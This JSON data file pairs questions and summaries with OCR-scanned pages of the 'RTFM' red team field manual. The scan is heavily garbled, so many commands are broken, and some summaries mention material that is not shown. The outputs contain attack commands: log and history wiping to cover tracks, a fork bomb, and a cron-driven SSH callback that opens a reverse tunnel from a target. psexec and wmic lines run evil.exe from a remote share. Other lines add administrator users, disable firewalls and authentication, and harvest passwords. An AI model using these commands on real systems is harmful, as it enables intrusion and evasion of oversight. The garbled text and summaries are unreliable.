[
  {
    "input": "What is the main purpose of the \"RTFM. Copyright © 2013 by Ben Clark\" statement at the beginning of the text?",
    "summary": "This text is a copyright notice and table of contents for a book titled \"RTFM\" by Ben Clark, published in 2013. It includes information about permissions, trademarks, and the book's structure, covering topics like NIX, WINDOWS, NETWORKING, and more. The book is intended for technical readers and provides cheat sheets, tips, and resources for information security and networking.",
    "output": "=\n&! Q E-4 !\nE-\niXl\n'-\nz ~\n>\nJ':q H\nu\n,...,\nrz1\n>-1\n:E\n9\n0 < : r : :\nC)\n~\nj\nModified without permission by 0E800 (3/2014)\nRTFM. Copyright © 2013 by Ben Clark\nAll rights reserved. No part of this work may be reproduced or transmitted\nin any form or by any means, without prior written permission of the\ncopyright owner.\n\nISBN-10: 1494295504\n\nISBN-13: 978-1494295509\nTechnical Editor: Joe Vest\nGraphic: Joe Vest\nProduct and company names mentioned herein may be the trademarks of their\nrespective owners. Rather than use a trademark symbol with every occurrence\nof a trademarked name, the author uses the names only in an editorial\nfashion, with no intention of infringement of the trademark. Use of a term\nin this book should not be regarded as affecting the validity of any\ntrademark or service mark.\nThe information in this book is distributed 11as is11• While everj precaution\nwas taken to ensure the accuracy of the material, the author assumes no\nresponsibility or liability for errors or omissions, or for damages\nresulting from the use of the information contained herein.\n\nTABLE OF CONTENTS\n*NIX. ................................................................................................................................................................4\nWINDOWS •••••..••.•.•••••••••••.•••••••••••...••..•••..•••.••.••...••..••••...•••.••.••••.•••••.••..••.•••.••••.•••.••...•••••..••..••••••..••••.••.••.•••••• 14\nNETWORKING •••••..•••••••..••...••...••..••••.••••••••••.••••.•••..••••••.••••...•..••••••.•••••••••••.•••••••••.•••.••..••••••••••••••••••.•••••••••.••.•• 34\nTIPS AND TRICKS ...••..•••..•••.••••••••..••••••.•••..••...•••••••••...•••.•••••••••••••.•••••.••.••••••..••••••••.•••.•••••••.••..••••••.••••••••.••.•..••• 42\nTOOL SYNTAX •••••••••••••••••••••••.••••.••••..•••••.•••••••••••••..••••••.••••.•.••••••••.••••••••..•••••.••.•••••••.••..•••••••••••••••••••••••••••••••..• 50\nWEB •••••..•••.••.•••••••.••..•••..••...••..•••..••..••••••.•••...••..•••.••••••..••••..••.•••.••••••••.•••••••.••.•••••.•••••••••••..•••••••••..••.•••••••.••.••.• 66\nDATABASES •••••••.•••••••...••..•••..••.•.•••••..••...•••.•••••.••••..••.•.••••.•...••.•••••.••.•••••..•••••.••.•••••..•••..•••••••••••••••••.•••••••••••••.•. 72\n\nPROGRAMMING ............................................................................................................................................7 6\nWIRELESS ..•••••••..•••••••..•••..•••..••...•••••••••...••..•••..•••••..••...••••.....••.••••.••..••••••.•••••.••.••••••.•••..•••••••••••••••••••••••••••••••.•. 84\nREFERENCES •••..•••••••••••••.••••••.•••..••...•••••.•••..•••..••...•••••..••..••.•••••..•••••.••.•••••••••••••••••••..•••••..•••..••••.•••••••..••.•••••••••• 94\nINDEX ••••...••••••••••••..••...••..•••..•••••••••••.••...••..•••••••••••.•••..••••••.•••••••••..•..•••••..•••••.••.•••.••••••..•••••••••••••••••.•••••••••••••.•. 95\nBonus Material added by 0E800\nNmap Cheat Sheet TCP/IP INFOSEC MIND MAPS:\nNmap Cheat Sheet 2 VLAN INFRASTRUCTURE TESTS\nWireshark Display Filters VOIP PRACTICE LABS\nCommon Ports List WLAN VM / LIVECD\nGoogle Cheat Sheet HTML BROWSER PLUGINS\nScapy PHP WIFI"
  },
  {
    "input": "What are the key networking and security concepts covered in the provided text?",
    "summary": "The text lists various networking and security-related terms and commands, including TCPDUMP, CSS VPN, NAT, Regular Expressions, ISO 27001, QoS, PCI DSS, SQL Server, IPv4, IPv6, VIRUS, WORMS, and Linux network commands for managing connections, IP settings, and security. It also covers topics like domain lookups, firewall configurations, and VPN key management.",
    "output": "TCPDUMP CSS VPN\nPyhon WEB APP\nNAT\nRegular Expressions ISO 27001\nQoS\n\nPCI DSS\nSQL Server\nIPv4\n\nVIRUS\nIPv6\n\nWORMS\n3\n'\"Hili! '-.-.j-'#'!lli-,··~ f''{-• w(' •-'lrt''MMfW- '-)'''M«V#ffr'ZW¥11i!f--wiiMfM'M'WMi'\"\"f%ffi!I'''IW\"\"liH;:-~@ H~51~M «;~\"'\n\nLINUX NETWORK COMMANDS\nwatch ss -tp Network connections\nnetstat -ant Tcp connections -anu=udp\nnetstat -tulpn Connections with PIDs\nlsof -i Established connections\nsmb:// ip /share Access windows smb share\nshare user x.x.x.x c$ Mount Windows share\nsmbclient -0 user\\\\\\\\ ip \\\\ share Sl1B connect\nifconfig eth# ip I cidr Set IP and netmask\nifconfig ethO:l ip I cidr Set virtual interface\nroute add default gw gw lp Set GW\nifconfig eth# mtu [size] Change t~TO size\nexport l1AC=xx: XX: XX: XX: XX: XX Change t~AC\nifconfig int hw ether t~AC Change t~AC\nmacchanger -m l1AC int Backtrack t~AC changer\niwlist int scan Built-in wifi scanner\ndig -x ip Domain lookup for IP\nhost ip Domain lookup for IP\nhost -t SRV service tcp.url.com Domain SRV lookup\ndig @ ip domain -t AXrR DNS Zone Xfer\nhost -1 domain namesvr DNS Zone Xfer\nip xfrm state list Print existing VPN kejs\nip addr add ip I cidr aev ethO Adds 'hidden' interface\n/var/log/messages I grep DHCP List DHCP assignments\ntcpkill host ip and port port Block ip:port\necho \"1\" /proc/sys/net/ipv4/ip forward Turn on IP Forwarding\necho ''nameserver x.x.x.x'' /etc7resolv.conf Add DNS Server"
  },
  {
    "input": "What are the key Linux commands and utilities discussed in this text?",
    "summary": "This text provides a list of Linux commands for system information, file operations, scripting, and network tasks. It includes commands for checking user sessions, process listings, disk usage, and system configurations. Additionally, it covers utilities for transferring files, managing users, and handling file timestamps, as well as scripts for domain resolution, IP banning, and SSH callbacks. The text also outlines Linux file system structure and some iptables rules for network traffic control.",
    "output": "LINUX SYSTEM INFO\nid Current username\nw Logged on users\nwho -a User information\nlast -a Last users logged on\nps -ef Process listing (top)\ndf -h Disk usage (free)\nuname -a Kernel version/CPU info\nmount t1ounted file Sjstems\ngetent passwd Show list of users\nPATH~$PATH:/home/mypath Add to PATH variable\nkill pid Kills process with pid\ncat /etc/issue Show OS info\ncat /etc/'release' Show OS version info\ncat /proc/version Show kernel info\nrpm --querJ -all Installed pkgs (Redhat)\nrpm -ivh ) .rpm Install RPM (-e~remove)\ndpkg -get-selections Installed pkgs (Obuntu)\ndpkg -I '.deb Install DEB (-r~remove)\npkginfo Installed pkgs (Solaris)\nwhich tscsh/csh/ksh/bash Show location of executable\nchmod -so tcsh/csh/ksh Disable shell , force bash\n5\n\nLINUX UTILITY COMMANDS\nwget http:// url -0 url.txt -o /dev/null Grab url\nrdesktop ip Remote Desktop to ip\nscp /tmp/file user@x.x.x.x:/tmp/file Put file\nscp user@ remoteip :/tmp/file /tmp/file Get file\nuseradd -m user Add user\npasswd user Change user password\nrmuser unarne Remove user\nscript -a outfile Record shell : Ctrl-D stops\napropos subject Find related command\nhistory View users command history\n! num Executes line # in history\n\nLINUX FILE COMMANDS\ndiff filel file2 Compare files\nrm -rf dir Force delete of dir\nshred -f -u file Overwrite/delete file\ntouch -r ref file file t1atches ref_ file timestamp\ntouch -t YYYY11t1DDHHSS file Set file timestamp\nsudo fdisk -1 List connected drives\nmount /dev/sda# /mnt/usbkey t1ount USB key\nmd5sum -t file Compute md5 hash\necho -n \"str11 I md5sum Generate md5 hash\nshalsum file SHAl hash of file\nsort -u Sort/show unique lines\ngrep -c ''str'' file Count lines w/ ''str''\ntar cf file.tar files Create .tar from files\ntar xf file.tar Extract .tar\ntar czf file.tar.gz files Create .tar.gz\ntar xzf file.tar.gz Extract .tar.gz\ntar cjf file.tar.bz2 files Create .tar.bz2\ntar xjf file.tar.bz2 Extract .tar.bz2\ngzip file Compress/rename file\ngzip -d file. gz Decompress file.gz\nupx -9 -o out.exe orig.exe UPX packs orig.exe\nzip -r zipname.zip \\Directory\\' Create zip\ndd skip=lOOO count=2000 bs=S if=file of=file Cut block 1K-3K from file\nsplit -b 9K \\ file prefix Split file into 9K chunks\nawk 'sub(\"$\".\"\\r\")' unix.txt win.txt Win compatible txt file\nfind -i -name file -type '.pdf Find PDF files\nfind I -perm -4000 -o -perm -2000 -exec ls - Search for setuid files\nldb {) \\;\ndos2unix file Convert to ~nix format\nfile file Determine file type/info\nchattr (+/-)i file Set/Unset immutable bit\nLINUX ~SC COMMANDS\nunset HISTFILE Disable history logging\nssh user@ ip arecord - I aplay - Record remote mic\ngee -o outfile myfile.c Compile C,C++\ninit 6 Reboot (0 = shutdown)\ncat /etc/1syslog1.conf 1 grep -v ''\"#'' List of log files\ngrep 'href=' file 1 cut -d\"/\" -f3 I grep Strip links in url.com\nurl lsort -u\ndd if=/dev/urandom of= file bs=3145\"28 l1ake random 311B file\ncount=lOO\n\nLINUX COVER YOUR TRACKS COMMANDS\n\nII II\necho \"\" /var/log/auth.log Clear auth.log file\necho '''' -/.bash history Clear current user bash history\nrrn -/.bash histor/ -rf Delete .bash_history file\nhistory -c Clear current session history\nexport HISTFILESIZE=O Set historj max lines to 0\nexport HISTSIZE=O Set histroy max commands to 0\nunset HISTFILE Disable history logging (need to\nlogout to take effect)\nkill -9 $$ Kills current session\nln /dev/null -/.bash_historj -sf Perrnanentlj send all bash history\ncommands to /dev/null\n\nLINUX FILE SYSTEM STRUCTURE\n/bin User binaries\n/boot Boot-up related files\n/dev Interface for system devices\n/etc Sjstern configuration files\n/horne Base directory for user files\n/lib Critical software libraries\n/opt Third party software\n/proc Sjstern and running programs\n/root Home directory of root user\n/sbin System administrator binaries\n/trnp Temporary files\n/usr Less critical files\n/var Variable Sjstern files\n\nLINUX FILES\n/etc/shadow Local users' hashes\n/etc/passwd Local users\n/etc/group Local groups\n/etc/rc.d Startup services\n/etc/init.d Service\n/etc/hosts Known hostnames and IPs\n/etc/HOSTNAl1E Full hostnarne with domain\n/etc/network/interfaces Network configuration\n/etc/profile System environment variables\n/etc/apt/sources.list Ubuntu sources list\n/etc/resolv.conf Narneserver configuration\n/horne/ user /.bash historj Bash history (also /root/)\n/usr/share/wireshark/rnanuf Vendor-t1AC lookup\n-/.ssh/ SSH keystore\n/var/log System log files (most Linux)\n/var/adrn System log files (Unix)\n/var/spool/cron List cron files\n/var/log/apache/access.log Apache connection log\n/etc/fstab Static file system info\n\nLINUX SCRIPTING\n\nPING SWEEP\nfor x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep \"64 b\" lcut -d\" \"-f4\nips.txt; done\n\nAUTOMATED DOMAIN NAME RESOLVE BASH SCRIPT\n#!/bin/bash\necho \"Enter Class C Range: i.e. 192.168.3\"\nread range\nfor ip in {1 .. 254 .. l};do\nhost $range.$ip lgrep 11name pointer11 lcut -d\" 11 -fS\ndone\nFORK BOMB (CREATES PROCESSES UNTIL SYSTEM \"CRASHES\")\n: (){:I: & I;:\n\nDNS REVERSE LOOKUP\nfor ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip I grep $ip dns.txt; done;\n\nIP BANNING SCRIPT\n#!/bin/sh\n# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2\n# It assumes 1 is the router and does not ban IPs .20, .21, .22\ni=2\nwhile $i -le 253 l\ndo\nif [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then\necho \"BANNED: arp -s 192.168.1.$i\"\narp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa\nelse\necho 11IP NOT BANNED: 192.168.1.$i1.'.A~.'AJ..J.J,l!A.l.!J..J!AJ..AAAAJ.II\neChO 11.1} J A}. J, I A J. 11 A A .1. /.). J. I 1 J.} J. I A I I I.) 1 .I A).. A .l. J. J.} .I),).. J.}.}).. J. A A; J, J,. J.ll\nfi\ni='expr $i +1'\ndone\n8\n-;~\"--(':it'ieit#'r'filff I! . l • 'f -· ,. .. .. .. --·--·~\n\nSSH CALLBACK\nSet up script in crontab to callback ever} X minutes. Highlj recommend JOU\nset up a generic user on red team computer (with no shell privs). Script\nwill use the private kej (located on callback source computer) to connect\nto a public key (on red team computer). Red teamer connects to target via a\nlocal SSH session (in the example below, use #ssh -p4040 localhost)\n#!/bin/sh\n# Callbac~: script located on callback source computer (target)\nkillall ssh /dev/null 2 &1\nsleep 5\n\nREMLIS-4040\nREMUSR-user\nHOSTS=''domainl.com domain2.com domain3.com''\nfor LIVEHOST in SHOSTS;\ndo\nCOUNT-S(ping -c2 $~!VEHOST I grep 'received' 1 awk -F',' ' ( print\n$2 } ' awk ' ( print $1 I 'I\nif [ [ $COUN7 -gt 0 ; ] ; then\nssh -R $(REMLIS}:localhost:22 -i\n\"/home/$(REMUSR}/.ssh/id rsa\" -N $(LIVEHOST} -1 $(REMUSR}\n:i\n\nIPTABLES\ncounters) rules to stdout\niptables-restore file Restore iptables rules\niptables -~ -v --line-numbers List all iptables rules with\naffected and line numbers\niptables -F Flush all iptables rules\niptables -P INPUT/FORWARD/OUTPUT Change default polic; for\nACCEPT/REJECT/DROP rules that don't match rules\niptables -A INPUT -i interface -m state - Allow established\nstate RELATED,ESTABLcSHED -j ACCEPT connections on INPUT\niptables -D INPUT - Delete cth inbound rule\niptables -t raw -L -n Increase throughput b;\nturning off statefulness\niptables -P INPUT DROP Drop all packets\n\nALLOW SSH ON PORT 22 OUTBOUND\niptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state\nNEW,ESTABLISHED -j ACCEPT\niptables -A INPUT -i iface -p tcp --sport 22 -m state --state\nESTABLISHED -j ACCEPT"
  },
  {
    "input": "What are the key firewall rules and commands used to allow ICMP traffic, set up port forwarding, and restrict incoming connections to specific IP ranges and ports in the provided text?",
    "summary": "The text provides commands to allow ICMP outbound traffic and set up port forwarding. It also includes rules to restrict incoming traffic to specific IP ranges and ports, logging dropped packets. Additionally, it lists commands for managing services with update-rc.d, configuring screen sessions, capturing network traffic with tcpdump, and mounting SMB shares on Kali Linux. It also mentions pfSense commands for managing firewall rules and configurations.",
    "output": "ALLOW ICMP OUTBOUND\niptacles -A OUTPUT -i iface -p icmp --icmp-t;pe echo-request -j ACCEPT\niptables -A INPUT -o iface -p icmp --icmp-tjpe echo-repl; -j ACCEPT\n\nPORT FORWARD\necho \"1\" /proc/sjs/net/lpv4/lp forward\nOR- SJSCtl net.lpv4.lp forward~1\niptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport\n443 -to-destination attk 1p :443\niptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s target subnet\ncidr -d attackip --dport 443 -to-source pivotip\niptables -t filter -I FORWARD 1 -j ACCEPT\nALLOW ONLY 1.1.1. 0/24, PORTS 80,443 AND LOG DROPS TO\n/VAR/LOG/MESSAGES\niptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTAB~ISHED,NEW\n-p tcp -m multipart --dports 80,443 -j ACCEPT\niptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -P INPUT DROP\niptables -A OUTPUT -o ethO -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\niptables -A OUTPUT -o lo -j ACCEPT\niptables -N LOGGING\niptables -A INPUT -j LOGGING\niptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix \"DROPPED \"\niptables -A LOGGING -j DROP\n10\n\nUPDATE-RC.D\n• Check/change startup services\nservice --status-all [+] Service starts at boot\n[-] Service does not start\nservice service start Start a service\nservice service stop Stop a service\nservice service status Check status of a service\nupdate-rc.d -f service remove Remove a service start up cmd (\nf if the /etc/init.d start up\nfile exists I\nupdate-rc.d service defaults Add a start up service\n\nCHKCONFIG\n• Available in Linux distributions such as Red Hat Enterprise Linux (RHEL),\nCentOS and Oracle Enterprise Linux (OEL)\nchkconfig --list List existing services and run\nstatus\nchkconfig service -list Check single service status\nchkconfig service on [--level 3] Add service [optional to add\nlevel at which service runs]\nchkconfig service off [--level 3] Remove service\ne.g. chkconfig iptables off\n\nSCREEN\n(C-a ~~ Control-a)\nscreen -S name Start new screen with name\nscreen -ls List running screens\nscreen -r name Attach to screen name\nscreen -S name -X cmd Send crnd to screen anrne\nC-a List keybindings (help)\nC-a d Detach\nC-a D D Detach and logout\nC-a c Create new window\nC-a C-a Switch to last active window\nC-a ' numlname Switch to window numlname\nC-a \" See windows list and change\nC-a k Kill current window\nC-a S Split display horizontally\nC-a V Split display vertically\nC-a tab Jump to next display\nC-a X Remove current region\nC-a Q Remove all regions but current\n11\nXll\nCAPTURE REMOTE Xll WINDOWS AND CONVERT TO JPG\nxwd -display ip :0 -root -out /tmp/test.xpm\nxwud -in /tmp/test1.xpm\nconvert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg\nOPEN Xll STREAM VIEWING\nxwd -display 1.1.1.1:0 -root -silent -out x11dump\nRead dumped file with xwudtopnm or GIMP\n\nTCPDUMP\n\nCAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE\ntcpdump -i ethO -XX -w out.pcap\n\nCAPTURE HTTP TRAFFIC TO 2 . 2 . 2 . 2\ntcpdump -i ethO port 80 dst 2.2.2.2\n\nSHOW CONNECTIONS TO A SPECIFIC IP\ntcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24\n\nPRINT ALL PING RESPONSES\ntcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'\n\nCAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP\ntcpdump -i ethO -c 50 -tttt 'udp and port 53'\n\nNATIVE KALI COMMANDS\n\nWMIC EQUIVALENT\nwmis -U DOMAIN\\ user % password II· DC cmd.exe /c command\nMoUNT SMB SHARE\n# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs\nmount.cifs // ip /share /mnt/share -o\nuser= user ,pass= pass ,sec=ntlrnssp,domain= domain ,rw\n\nUPDATING KALI\napt-get update\napt-get upgrade\n12\n\nPFSENSE\npfSsh.php pfSense Shell System\npfSsh.php playback enableallowallwan Allow all inbound WAN\nconnections (adds to visible\nrules in WAN rules)\npfSsh.php playback enablesshd Enable ssh inbound/outbound\npfctl -sn Show NAT rules\npfctl -sr Show filter rules\npfctl -sa Show all rules\nviconfig Edit config\nrm /tmp/config.cache Remove cached (backup)\nconfig after editing the\ncurrent running\n/etc/rc.reload_all Reload entire config"
  },
  {
    "input": "What are the key commands and tools used for enumerating Windows domain users, groups, and system information?",
    "summary": "The text provides a list of commands for enumerating system information, managing services, configuring network settings, and launching Meterpreter on Windows systems. It also includes commands for remote administration, file operations, and registry access, along with instructions for using PowerShell and WMI to gather data and perform tasks. Additionally, it outlines methods for launching malicious activities and testing security tools like AV and IDS.",
    "output": "SOLARIS\nifconfig -a List of interfaces\nnetstat -in List of interface\nifconfig -r Route listing\nifconfig ethO dhcp Start DHCP client\nifconfig ethO plumb up ip netmask nmask Set IP\nroute add default ip Set gateway\nlogins -p List users w/out passwords\nsvcs -a List all services w/ status\nprstat -a Process listing (top)\nsvcadm start ssh Start SSH service\ninetadm -e telnet (-d for disable) Enable telnet\nprtconf I grep Memorj Total physical memory\niostat -En Hard disk size\nshowrev -c /usr/bin/bash Information on a binary\nshutdown -i6 -gO -y Restart system\ndfmounts List clients connected NFS\nsmc t1anagement GUI\nsnoop -d int -c pkt # -o results.pcap Packet capture\n/etc/vfstab File system mount table\n/var/adm/logging Login attempt log\n/etc/default/' Default settings\n/etc/system Kernel modules & config\n/var/adm/messages Syslog location\n/etc/auto ' Automounter config files\n/etc/inet/ipnodes IPv4/IPv6 host file\n13\n\nWINDOWS VERSIONS\nNT 3.1 Windows NT 3.1 (All)\nNT 3.5 Windows NT 3.5 (All)\nNT 3.51 Windows NT 3.51 (All)\nNT 4.0 Windows NT 4.0 (All)\nNT 5.0 Windows 2000 (All)\nNT 5.1 Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)\nNT 5.2 Windows XP (64-bit, Pro 64-bit)\nWindows Server 2003 & R2 (Standard, Enterprise)\nWindows Home Server\nNT 6.0 Windows Vista (Starter, Home, Basic, Home Premium,\nBusiness, Enterprise, Ultimate)\nWindows Server 2008 (Foundation, Standard, Enterprise)\nNT 6.1 Windows ~ (Starter, Home, Pro, Enterprise, Ultimate)\nWindows Server 2008 R2 (Foundation, Standard, Enterprise)\nNT 6.2 Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM))\nWindows Phone 8\nWindows Server 2012 (Foundation, Essentials, Standard)\n\nWINDOWS FILES\n%SYSTEt~ROOT% Typically C:\\Windows\n%SYSTEMROOT%\\System32\\drivers\\etc\\hosts DNS entries\n%SYSTEMROOT%\\System32\\drivers\\etc\\networks Network settings\n%SYSTEt~ROOT% \\ system32 \\ config\\SAM User & password hashes\n%SYSTEMROOT%\\repair\\SAt~ Backup copy of SAt~\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAt~ Backup copy of SAt~\n%WINDIR%\\system32\\config\\AppEvent.Evt Application Log\n%WINDIR%\\system32\\config\\SecEvent.Evt Security Log\n%ALLUSERSPROFILE%\\Start Menu\\Programs\\Startup\\ Startup Location\n%USERPROFILE%\\Start Menu\\Programs\\Startup\\ Startup Location\n%SYSTEMROOT%\\Prefetch Prefetch dir (EXE logs)\n\nSTARTUP DIRECTORIES\nWINDOWS NT 6.1,6.0\n# All users\n%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n# Specific users\n%SystemDrive%\\Users\\%UserName%\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\nWINDOWS NT 5.2, 5.1, 5.0\n%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\nWINDOWS 9x\n%SystemDrive%\\wmiOWS\\Start Menu\\Programs\\Startup\nWINDOWS NT 4. 0, 3. 51, 3. 50\n%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup\n15\n\nWINDOWS SYSTEM INFO COMMANDS\nver Get OS version\nsc query state=all Show services\ntasklist /svc Show processes & services\ntasklist /m Show all processes & DLLs\ntasklist /S ip /v Remote process listing\ntaskkill /PID pid /F Force process to terminate\nsysteminfo /S ip /U domain\\user /P Pwd Remote system info\nreg query\\\\ ip \\ RegDomain \\ Key /v Query remote registry,\nValue /s=all values\nreg query HKLM /f password /t REG SZ /s Search registrj for password\nfsutil fsinfo drives - List drives •must be admin\ndir /a /s /b c:\\'.pdf' Search for all PDFs\ndir /a /b c:\\windows\\kb' Search for patches\nfindstr /si password' .txt I •.xmll •.xls Search files for password\ntree /F /A c:\\ tree.txt Directory listing of C:\nreg save HKLl~\\Security security.hive Save securitj hive to file\necho %USERNAl~E% Current user\nWINDOWS NET /DOMAIN COMMANDS\nnet view /domain Hosts in current domain\nnet view /domain: [t~YDOHAIN] Hosts in [l~YDOl1AIN]\nnet user /domain All users in current domain\nnet user user pass /add Add user\nnet localgroup \"Administrators\" user /add Add user to Administrators\nnet accounts /domain Domain password policy\nnet localgroup \"Administrators\" List local Admins\nnet group /domain List domain groups\nnet group \"Domain Adrnins\" /domain List users in Domain Adrnins\nnet group \"Domain Controllers11 /domain List DCs for current domain\nnet share Current SMB shares\nnet session I find I \"\\\\\" Active SHB sessions\nnet user user /ACTIVE:jes /domain Unlock domain user account\nnet user user '' newpassword '' /domain Change domain user password\nnet share share c:\\share Share folder\n/GRANT:Everyone,FULL\n\nWINDOWS REMOTE COMMANDS\ntasklist /S ip /v Remote process listing\nsysteminfo /S ip /U domain\\user /P Pwd Remote systeminfo\nnet share \\\\ ip Shares of remote computer\nnet use \\\\ ip Remote filesystem (IPC$)\nnet use z: \\\\ ip \\share password l~ap drive, specified\n/user: D0l1AIN\\ user credentials\nreg add \\\\ ip \\ regkej \\ value Add registry key remotely\nsc \\\\ ip create service Create a remote service\nbinpath=C:\\Windows\\System32\\x.exe start= (space after start=)\nauto\nxcopy /s \\\\ ip \\dir C:\\local Copy remote folder\nshutdown /m \\\\ ip /r /t 0 /f Remotely reboot machine\n16\n\nWINDOWS NETWORK COMMANDS\nipconfig I all IP configuration\nipconfig /displaydns Local DNS cache\nnetstat -ana Open connections\nnetstat -anop tcp 1 Netstat loop\nnetstat -ani findstr LISTENING LISTENING ports\nroute print Routing table\narp -a Known l1ACs (ARP table I\nnslookup, set type=any, ls -d domain DNS Zone Xfer\nresults.txt, exit\nnslookup -type=SRV _www._tcp.url.com Domain SRV lookup ( ldap,\nkerberos, sip)\ntftp -I ip GET remotefile TFTP file transfer\nnetsh wlan show profiles Saved wireless profiles\nnetsh firewall set opmode disable Disable firewall ('Old)\nnetsh wlan export profile folder=. key=clear Export wifi plaintext pwd\nnetsh interface ip show interfaces List interface IDs/MTUs\nnetsh interface ip set address local static Set IP\nip nmask gw ID\nnetsh interface ip set dns local static ip Set DNS server\nnetsh interface ip set address local dhcp Set interface to use DHCP\n\nWINDOWS UTILITY COMMANDS\ntype file Display file contents\ndel path\\' .• /a /s /q /f Forceably delete all files\nin path\nfind /I ''str'' filename Find \"str\"\ncommand I find /c /v Line count of cmd output\nat HH:Ml1 file [args] (i.e. at 14:45 cmd Schedule file to run\n/c)\nrunas /user: user \" file [args]11 Run file as user\nrestart /r /t 0 Restart now\ntr -d '\\15\\32' win.txt unix.txt Removes CR & 'Z ('nix)\nmakecab file Native compression\nWusa.exe /uninstall /kb: ### Uninstall patch\ncmd.exe \"wevtutil qe Application /c:40 CLI Event Viewer\n/f:text /rd:true\"\nlusrrngr.rnsc Local user manager\nservices.msc Services control panel\ntaskmgr.exe Task manager\nsecpool.rnsc Security policy manager\neventvwr.rnsc Event viewer\n1?\n\nMISC. COMMANDS\nLoCK WORKSTATION\nrundll32.dll user32.dll LockWorkstation\n\nDISABLE WINDOWS FIREWALL\nnetsh advfirewall set currentprofile state off\nnetsh advfirewall set allprofiles state off\n*\nNATIVE WINDOWS PORT FORWARD ( MUST BE ADMIN)\nnetsh interface portproxy add v4tov4 listenport=3000\nlistenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2\n#Remove\nnetsh interface portproxy delete v4tov4 listenport=3000\nlistenaddress=l.l.l.l\n\nRE-ENABLE COMMAND PROMPT\nreg add HKCU\\Software\\Policies\\t1icrosoft\\Windows\\System /v DisableCHD /t\nREG DWORD /d 0 /f\n\nPSEXEC\n\nEXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS\npsexec /accepteula \\\\ targetiP -u domain\\user -p password -c -f\n\\\\ smbiP \\share\\file.exe\n\nRUN REMOTE COMMAND WITH SPECIFIED HASH\npsexec /accepteula \\\\ ip -u Domain\\user -p Lt1 NTLH cmd.exe /c dir\nc:\\Progra-1\n\nRUN REMOTE COMMAND AS SYSTEM\npsexec /accepteula \\\\ ip -s cmd.exe\n18\nTERMINAL SERVICES (RDP)\n\nSTART RDP\n1. Create regfile.reg file with following line in it:\nHKEY LOCAL t1ACHINE\\SYSTEH\\CurrentControlSet \\Control\\ TerminalService\n2. \"fDe~yTSCo~nections\"=dword: 00000000\n3. reg import reg file. reg\n4. net start ''terrnservice''\n5. sc config terrnservice start= auto\n6. net start terrnservice\n--OR-\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEH\\CurentControlSet\\Control \\Terminal\nServer\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nTUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)\nREG ADD \"HKLt1\\System\\CurrentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f\nDISABLE NETWORK LEvEL AUTHENTICATION 1 ADD FIREWALL EXCEPTION\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEt1\\CurentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\nnetsh firewall set service type = remotedesktop mode = enable\nIMPORT A SCHEDULE TASK FROM AN \"EXPORTED TASK\" XML\nschtasks.exe /create /tn t1yTask /xml \"C:\\l1yTask.xml\" /f\n19\n\nWMIC\nwmic [alias] get /? List all attributes\nwmic [alias] call /? Callable methods\nwmic process list full Process attributes\nwmic startupwmic service Starts wmic service\nwmic ntdomain list Domain and DC info\nwmic qfe List all patches\nwrnic process call create \"process name\" Execute process\nwmic process where name=\"process\" call Terminate process\nterminate\nwmic logicaldisk get description,name View logical shares\nwmic cpu get DataWidth /format:list Display 32 I I 64 bit\nWMIC [ALIAS] [WHERE] [CLAUSE]\n[alias] == process, share, startup, service, nicconfig, useraccount, etc.\n[where] ==where (name=\"cmd.exe\"), where (parentprocessid!=[pid]\"), etc.\n[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],\ndelete\n\nEXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED\n\nCREDENTIALS\nwmic /node: targetiP /user:domain\\user /password:password process call\ncreate \"\\ \\ smbiP \\share\\evil.exe\"\n\nUNINSTALL SOFTWARE\nwmic product get name /value # Get software names\nwmic product where name=11XXX\" call uninstall /nointeractive\n\nREMOTELY DETERMINE LOGGED IN USER\nwmic /node:remotecomputer computersystern get username\n~OTE PROCESS LISTING EVERY SECOND\nwmic /node:machinename process list brief /every:l\n~TELY START RDP\nwmic /node:\"machinename 4\" path Win32_TerminalServiceSetting where\nAllowTSConnections=''O'' call SetAllowTSConnections ''1''\n\nLIST NUMBER OF TIMES USER HAS LOGGED ON\nwmic netlogin where (name like \"%adm%\") get numberoflogons\n\nSEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY\nwmic service get narne,displayname,pathnarne,startrnode lfindstr /i nauton\nlfindstr /i /v 11C:\\windows\\\\'' lfindstr /i /v 111111\n20\n-------~---- '1 -vt t• -r Wfrl-iriWHfif ';+-:,i·~ilw:oo¢:M y 